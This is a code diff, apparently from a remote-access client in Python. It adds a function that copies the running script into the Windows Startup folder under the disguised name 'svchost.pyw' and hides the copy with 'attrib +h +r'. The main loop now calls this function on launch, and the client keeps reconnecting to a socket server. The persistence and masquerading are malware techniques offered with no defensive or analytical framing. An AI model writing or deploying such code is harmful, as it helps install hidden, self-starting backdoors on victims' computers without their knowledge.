@@ -196,8 +196,27 @@ class Socket:
             chdir("C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
             system("attrib +h +r " + file_name)
 
+    @staticmethod
+    def script_copy_to_startup():
+        file_name = "svchost.pyw"
+        try:
+            with open(__file__, "rb")as file:
+                content = file.read()
+        except (PermissionError, FileNotFoundError):
+            return False
+        path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + file_name
+        try:
+            with open(path, "wb+")as file:
+                file.write(content)
+        except (PermissionError, FileNotFoundError):
+            return False
+        chdir("C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
+        system("attrib +h +r " + file_name)
+        return True
+
 
 connection = Socket()
+connection.script_copy_to_startup()
 while True:
     if not connection.established:
         connection.connect_to_server(socket.gethostname(), 20000)
